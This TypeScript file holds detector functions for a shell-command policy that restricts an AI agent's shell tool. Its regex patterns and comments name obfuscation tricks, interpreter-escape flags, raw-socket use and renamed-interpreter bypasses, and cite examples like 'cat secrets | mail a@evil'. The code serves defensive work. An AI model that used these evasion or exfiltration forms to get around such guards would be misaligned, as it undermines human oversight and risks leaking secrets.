// Detector functions for the shell-command policy: obfuscation, script-write,
// argv-aware interpreter escapes, network-client argv[0], and inline-network
// scans, plus the tokenizer/quote helpers they share. The rule tables they
// match against live in shell-rules.ts; the engine that sequences them lives in
// shell-policy.ts.

import { isAbsolute, relative, resolve, join } from "node:path";
import { homedir } from "node:os";
import {
  INTERP_ESCAPE_BINS,
  NETWORK_CLIENT_BINS,
  DANGEROUS_INVOKE_BINS,
  INTERP_EVAL_FLAGS,
  RENAME_ESCAPE_EVAL_FLAGS,
} from "./shell-rules.js";
import { realpathDeep } from "./file-access.js";
import type { InlineEvalPolicy } from "./types.js";

export function detectObfuscation(command: string): string | null {
  // Hex-encoded sequences (e.g., \x72\x6d = "rm")
  if (/\\x[0-9a-f]{2}/i.test(command)) {
    return "Blocked: hex-encoded characters detected (possible obfuscation)";
  }
  // Octal escapes (e.g. \162\155 = "rm") are handled by the two ANSI-C / printf
  // checks below — there is deliberately NO bare-\NNN test here. bash does not
  // interpret a bare \NNN (`echo \162` prints "162", not "r"); the only real
  // octal attack vectors are the interpreted forms $'\162' and printf '\162',
  // caught by the "ANSI-C quoting with octal escapes" and "printf with escape
  // sequences" rules below. A bare-\NNN test added nothing over those and
  // false-positived on ordinary Windows paths, where the backslash is a path
  // separator: C:\Users\...\2024 May order.xlsx contains "\202" and was blocked
  // in every file-access mode.
  // Unicode escape sequences (e.g., rm = "rm")
  if (/\\u[0-9a-f]{4}/i.test(command)) {
    return "Blocked: unicode escape sequences detected (possible obfuscation)";
  }
  // Base64 inline decoding (echo BASE64 | base64 -d)
  if (/base64\s+(-d|--decode)/i.test(command)) {
    return "Blocked: base64 decode in command (possible obfuscation)";
  }
  // printf with escape sequences (printf '\x72\x6d')
  if (/\bprintf\b.*\\(x|u|[0-7])/i.test(command)) {
    return "Blocked: printf with escape sequences (possible obfuscation)";
  }
  // xxd / od reverse (decode hex to binary)
  if (/\bxxd\s+-r\b/i.test(command) || /\bod\b.*-A\s*x/i.test(command)) {
    return "Blocked: hex decode tool (possible obfuscation)";
  }
  // String concatenation tricks: a='r'; b='m'; $a$b
  // We already block $ metacharacter, but check for quoted var assignment patterns
  if (/\b[a-z]=['"][a-z]{1,3}['"]/i.test(command) && command.split("=").length > 3) {
    return "Blocked: suspicious variable assignment pattern (possible string concatenation obfuscation)";
  }
  // rev (reverse string to hide commands)
  if (/\brev\b/i.test(command)) {
    return "Blocked: 'rev' command (commonly used for obfuscation)";
  }
  // ANSI-C quoting with hex escapes (e.g., $'\x72\x6d')
  if (/\$'[^']*\\x[0-9a-fA-F]{2}/.test(command)) {
    return "Blocked: ANSI-C quoting with hex escapes detected";
  }
  // ANSI-C quoting with octal escapes (e.g., $'\162\155')
  if (/\$'[^']*\\[0-7]{3}/.test(command)) {
    return "Blocked: ANSI-C quoting with octal escapes detected";
  }
  // Very long commands are suspicious (likely encoded payloads)
  if (command.length > 2000) {
    return "Blocked: command exceeds 2000 characters (possible encoded payload)";
  }

  return null;
}

// ── Secret-placeholder injection into shell commands ──
// `{{SECRET_NAME}}` placeholders resolve ONLY in http_request (into headers,
// off-argv). The shell tool never resolves them, so `git clone
// https://{{GITHUB_SYNC_TOKEN}}@github.com` fails opaquely (literal braces
// reach git) — and resolving it here would be worse: the cleartext secret
// would land in argv (visible in any process listing) and the tool_progress
// command tails. Refuse the shape up front and redirect to the safe paths.
// Matches only the SCREAMING_SNAKE form real secret names use, so Go/Docker
// `{{.Field}}` (leading dot) and Jinja `{{ VAR }}` (spaces) don't trip it.
export function detectSecretPlaceholder(command: string): string | null {
  const m = command.match(/\{\{([A-Z][A-Z0-9_]*)\}\}/);
  if (!m) return null;
  return `Blocked: {{${m[1]}}} secret placeholders are not resolved in shell commands (that would leak the secret into argv / process listings). Use http_request — it injects {{SECRET_NAME}} into headers off-argv. For git over HTTPS the token is supplied via the credential helper, never the URL.`;
}

// Hard-block heredoc + inline-script writes targeting the repo. Workers were
// using `cat <<EOF > foo` and `python -c "open(...).write(...)"` to "edit"
// files; bash exits 0 even when the script silently no-ops, so the worker
// reported success after writing nothing. Force them to use write/edit tools
// (which return verifiable confirmations).
export function detectScriptWrite(command: string): string | null {
  // 1. Heredoc redirected to a file: `<<EOF >`, `<<-EOF >>`, `<<'EOF' > path`, etc.
  if (/<<-?\s*['"]?\w+['"]?[\s\S]*?>{1,2}\s*\S/.test(command)) {
    return "Use the write/edit tools instead — bash exit 0 ≠ work done.";
  }
  // 2. python/node/perl/ruby -c "..." that calls open()/write_text/writeFile/etc.
  //    We only flag when both an inline-script flag AND a write call appear.
  const hasInlineScript = /\b(python[23]?|node|perl|ruby)\b\s+-[ce]\s/i.test(command);
  if (hasInlineScript) {
    const writeCallPatterns = [
      /\bopen\s*\([^)]*,\s*['"][wax]b?\+?/i,              // open(path, 'w'/'a'/'x' or 'wb'/'ab'/'w+') - mode must be 2nd positional arg
      /\.write_text\s*\(/i,                              // pathlib write_text
      /\.write_bytes\s*\(/i,                             // pathlib write_bytes
      /\bwriteFileSync\s*\(/i,                           // node fs.writeFileSync
      /\bfs\.writeFile\s*\(/i,                           // node fs.writeFile
      /\bappendFileSync\s*\(/i,                          // node fs.appendFileSync
      /\bPath\s*\([^)]*\)\.write/i,                      // pathlib Path(p).write_*
      /\bshutil\.(copy|move)/i,                          // python shutil mutating
    ];
    if (writeCallPatterns.some(p => p.test(command))) {
      return "Use the write/edit tools instead — bash exit 0 ≠ work done.";
    }
  }
  // 3. sed -i / awk inplace editing files in-place
  if (/\bsed\s+(-[a-zA-Z]*i[a-zA-Z]*|-(-in-place))\b/i.test(command)) {
    return "Use the write/edit tools instead — bash exit 0 ≠ work done.";
  }
  if (/\bawk\b[^|]*\binplace\b/i.test(command)) {
    return "Use the write/edit tools instead — bash exit 0 ≠ work done.";
  }
  // 4. Plain redirect of `echo`/`printf` to a writable file path is allowed
  //    (small one-liners don't trip the silent-noop bug). Heredocs are the
  //    real problem because they swallow newlines + multi-line content.
  return null;
}

// Remove the contents of single- and double-quoted spans (and the quotes)
// so shell separators that are literal inside an argument — e.g. the `;` in
// `python -c "a; b"` — aren't mistaken for command chaining.
export function stripQuotedSpans(command: string): string {
  let out = "";
  let quote: string | null = null;
  for (const c of command) {
    if (quote) {
      if (c === quote) quote = null;
    } else if (c === '"' || c === "'") {
      quote = c;
    } else {
      out += c;
    }
  }
  return out;
}

// Split a command segment into whitespace-delimited tokens, treating a
// single- or double-quoted span as one opaque token (so the inline script body
// in `perl -e 'use Socket; ...'` is a single token, not the chain-breaking
// words inside it). Quote characters are stripped from the emitted token. Good
// enough for argv[0]/flag inspection — full shell word-splitting is not needed.
export function tokenizeCommand(segment: string): string[] {
  const tokens: string[] = [];
  let cur = "";
  let quote: string | null = null;
  let inToken = false;
  for (const c of segment) {
    if (quote) {
      if (c === quote) quote = null;
      else cur += c;
      inToken = true;
    } else if (c === '"' || c === "'") {
      quote = c;
      inToken = true;
    } else if (/\s/.test(c)) {
      if (inToken) { tokens.push(cur); cur = ""; inToken = false; }
    } else {
      cur += c;
      inToken = true;
    }
  }
  if (inToken) tokens.push(cur);
  return tokens;
}

// The basename of an executable token, lowercased, with any path prefix and a
// trailing Windows .exe removed. `/usr/bin/perl` → "perl", `Ruby.EXE` → "ruby".
function execBasename(token: string): string {
  const base = token.replace(/^.*[\\/]/, "").toLowerCase();
  return base.replace(/\.exe$/, "");
}

// ── C3-13: argv-aware interpreter-escape detection ──
// The bare-form denylist (`\bperl\s+-e\b`, …) only catches the flag IMMEDIATELY
// after the binary, so `perl -w -e`, `perl -Mstrict -e`, `ruby -rsocket -e`,
// `ruby -w -e` slip through. Tokenize each pipe segment; if argv[0]'s basename
// is an inline-eval interpreter and ANY later token is an eval/require flag —
// `-e`/`-E`/`-r`, or a clustered short-flag containing e/E/r (e.g. `-we`,
// `-rsocket`) — block it, regardless of intervening flags.
export function detectInterpreterEscape(command: string): string | null {
  for (const segment of command.split("|")) {
    const tokens = tokenizeCommand(segment);
    if (tokens.length === 0) continue;
    const bin = execBasename(tokens[0]);
    if (!INTERP_ESCAPE_BINS.has(bin)) continue;
    for (let i = 1; i < tokens.length; i++) {
      const t = tokens[i];
      if (t === "--") break; // end-of-flags; remaining tokens are operands
      if (!t.startsWith("-") || t.startsWith("--")) continue; // operand or long-flag
      // Short-flag (cluster). Flag chars come before any glued value: in
      // `-rsocket` the flag is `r`, "socket" is its argument. The eval/require
      // flags are the LEADING cluster chars up to the first that takes a value.
      // Simplest sound rule: if any of e/E/r appears in the short-flag token's
      // letters, treat it as an inline-eval/require escape.
      const flagBody = t.slice(1);
      if (/[eEr]/.test(flagBody)) {
        return `Blocked: ${bin} inline-eval/require flag (interpreter escape).`;
      }
    }
  }
  return null;
}

// ── C3-12/C3-14: network-client argv[0] denylist ──
// `fetch`/`http`/`https`/`xh`/`httpie`/`curlie` are network clients ONLY when
// they LEAD the command — `git fetch`/`npm fetch` are not. So gate them by the
// argv[0] basename of each pipe segment, never as a substring (spec (e)).
export function detectNetworkClientArgv0(command: string): string | null {
  for (const segment of command.split("|")) {
    const tokens = tokenizeCommand(segment);
    if (tokens.length === 0) continue;
    if (NETWORK_CLIENT_BINS.has(execBasename(tokens[0]))) {
      return "Blocked: raw shell network client — use http_request (SSRF-checked) instead.";
    }
  }
  return null;
}

// ── argv[0] dangerous-command basenames (FP-safe sibling of detectNetworkClientArgv0) ──
// Block these binaries when they are the INVOKED command (argv[0]) of any pipe
// segment, never as a substring — so a dangerous binary NAME appearing as an
// argument (`grep host`, `… | grep open`, `echo "ping it"`) is ALLOWED, while
// invoking it (`host evil`, `mount /dev/x /mnt`, `cat secrets | mail a@evil`) is
// blocked. This replaces the old `\bhost\s`/`\bopen\s`/… BLOCKED_COMMANDS
// substrings that false-positived on benign arguments. Same tokenize→basename
// approach as detectNetworkClientArgv0.
export function detectDangerousInvokeBin(command: string): string | null {
  for (const segment of command.split("|")) {
    const tokens = tokenizeCommand(segment);
    if (tokens.length === 0) continue;
    const bin = execBasename(tokens[0]);
    if (DANGEROUS_INVOKE_BINS.has(bin)) {
      return `Blocked: '${bin}' is a restricted network/system command. (If you only named it as an argument, rephrase — the block is on INVOKING it, not mentioning it.)`;
    }
  }
  return null;
}

// ── C3-17: raw-socket / network module use in node -e / python -c bodies ──
// The denylist above flags some HTTP *libraries* (requests/urllib/httpx) but
// misses RAW SOCKETS and the low-level node/python network modules, which give
// the same arbitrary-egress capability inside an inline script body. Broaden
// the inline-interpreter scan to also flag net/socket/https/http(module)/dgram/
// fetch/tls/connect. Only fires when an inline-script flag (node -e / python -c
// / perl -e / ruby -e) AND a network-module reference both appear, matching the
// existing detectScriptWrite style.
export function detectInlineNetwork(command: string): string | null {
  const hasInlineScript =
    /\b(python[23]?|node|perl|ruby)\b\s+-[a-zA-Z]*[ce]\b/i.test(command);
  if (!hasInlineScript) return null;
  const networkPatterns = [
    /\bimport\s+socket\b/i,                 // python: import socket
    /\bsocket\.socket\s*\(/i,               // python: socket.socket(...)
    /\brequire\s*\(\s*['"](net|https?|dgram|tls)['"]\s*\)/i, // node: require("net"/"http"/"https"/"dgram"/"tls")
    /\bimport\s+.*\bfrom\s+['"](net|https?|dgram|tls)['"]/i, // node ESM: import x from "net"
    /\bIO::Socket\b/i,                      // perl: IO::Socket
    /\buse\s+Socket\b/i,                    // perl: use Socket
    /\bTCPSocket\b/i,                       // ruby: TCPSocket
    /\bfetch\s*\(/i,                        // node 18+/deno global fetch()
    /\.connect\s*\(/i,                      // socket/Socket .connect(...)
  ];
  if (networkPatterns.some((p) => p.test(command))) {
    return "Blocked: raw socket / network module in inline script — use http_request (SSRF-checked) instead.";
  }
  return null;
}

// Is this argv[0] token written as a PATH (vs. a bare command name resolved via
// $PATH)? `./myperl`, `../bin/x`, `/tmp/py`, `~/py`, `build/app` all are; a bare
// `node` / `perl` is not. Mirrors the path-shape intent of shell-path-guard's
// looksLikePath but for argv[0] (which that guard deliberately skips).
function isPathForm(token: string): boolean {
  return (
    token.startsWith("./") ||
    token.startsWith("../") ||
    token.startsWith("/") ||
    token.startsWith("~") ||
    token.includes("/") ||
    token.includes("\\")
  );
}

// Does a path-form argv[0] resolve into a model-writable tree? A renamed
// interpreter the model dropped to escape the basename denylist lives in
// exactly these trees — the workspace, the surrounding project root, or the
// user's home; a real system binary invoked by absolute path (e.g.
// /usr/bin/perl — already caught by the basename set) does not. A relative
// `./myperl` is anchored at the WORKSPACE (the agent's effective cwd when it
// runs a shell command), `~` expands to home, and both the target and the roots
// are realpath'd so a symlinked workspace/home still compares. The project root
// (workspace parent) is included because a relocated workspace bridges back
// there and the agent's checkout-relative tools can also write it. Best-effort:
// on a resolution failure, fall back to the lexical path.
function resolvesIntoWritableTree(token: string, workspace: string): boolean {
  let raw = token;
  if (raw === "~") raw = homedir();
  else if (raw.startsWith("~/") || raw.startsWith("~\\")) raw = join(homedir(), raw.slice(2));

  const rawWorkspace = resolve(workspace);
  const resolved = isAbsolute(raw) ? resolve(raw) : resolve(rawWorkspace, raw);

  let realWorkspace: string;
  let realProjectRoot: string;
  let realHome: string;
  let realTarget: string;
  try {
    realWorkspace = realpathDeep(rawWorkspace);
    realProjectRoot = realpathDeep(resolve(rawWorkspace, ".."));
    realHome = realpathDeep(resolve(homedir()));
    realTarget = realpathDeep(resolved);
  } catch {
    realWorkspace = rawWorkspace;
    realProjectRoot = resolve(rawWorkspace, "..");
    realHome = resolve(homedir());
    realTarget = resolved;
  }
  const inWorkspace = !relative(realWorkspace, realTarget).startsWith("..");
  const inProjectRoot = !relative(realProjectRoot, realTarget).startsWith("..");
  const inHome = !relative(realHome, realTarget).startsWith("..");
  return inWorkspace || inProjectRoot || inHome;
}

// ── R4-11/R4-13: refuse the inline-eval interpreter FORM (non-unrestricted) ──
// A regex over a Turing-complete `node -e`/`python -c` body cannot soundly say
// whether it touches the network (R4-11), and keying the escape detectors on a
// basename SPELLING set lets a renamed interpreter bypass them (R4-13). The
// sound fix is to refuse the FORM in common/workspace modes (unrestricted stays
// permissive) — the agent writes a path-guard-visible script file instead.
//   (a) a known interpreter basename invoked with its eval flag, OR
//   (b) the rename-escape: a model-writable-path argv[0] invoked with an
//       eval-style flag (legit workspace executables aren't run with `-e`).
// This complements (does not replace) detectInterpreterEscape/detectInlineNetwork,
// which stay as defense-in-depth. It does NOT blanket-deny workspace execution —
// only the eval-flag interpreter-escape shape. `sh -c`/`bash -c` are ALLOWED
// because no shell basename carries an eval-flag table (and `-c` is not a
// rename-escape flag for them: a bare `sh`/`bash` argv[0] is not a path form,
// and a path-form `./myshell -c` IS the rename-escape this targets).
export function detectInlineInterpreterEval(
  tokens: string[],
  policy: InlineEvalPolicy,
  workspace: string,
): string | null {
  if (policy === "allow") return null; // inline-eval permitted by policy
  if (tokens.length === 0) return null;
  const argv0 = tokens[0];
  const bin = execBasename(argv0);

  // (a) Known interpreter basename + its eval flag anywhere in the argv.
  const evalFlags = INTERP_EVAL_FLAGS[bin];
  if (evalFlags) {
    for (let i = 1; i < tokens.length; i++) {
      const t = tokens[i];
      if (t === "--") break; // end-of-flags; the rest are operands
      if (evalFlags.has(t)) {
        return `Blocked: ${bin} inline-eval flag (${t}) — write a script file (write/edit) and run that instead. A regex can't soundly vet an inline interpreter body, so this form is refused unless inline-eval is explicitly allowed.`;
      }
    }
    return null;
  }

  // (b) Rename-escape: a model-writable-path argv[0] (the model could drop a
  // renamed interpreter there) invoked with an eval-style flag. A real dev
  // executable (`./node_modules/.bin/tsc`, `./build/app`) is never run with
  // `-e '<code>'`, so this targets the rename-escape without breaking workflows.
  if (isPathForm(argv0) && resolvesIntoWritableTree(argv0, workspace)) {
    for (let i = 1; i < tokens.length; i++) {
      const t = tokens[i];
      if (t === "--") break;
      if (RENAME_ESCAPE_EVAL_FLAGS.has(t)) {
        return `Blocked: workspace executable invoked with an inline-eval flag (${t}) — looks like a renamed interpreter escaping the interpreter denylist. Write a script file and run that instead.`;
      }
    }
  }
  return null;
}
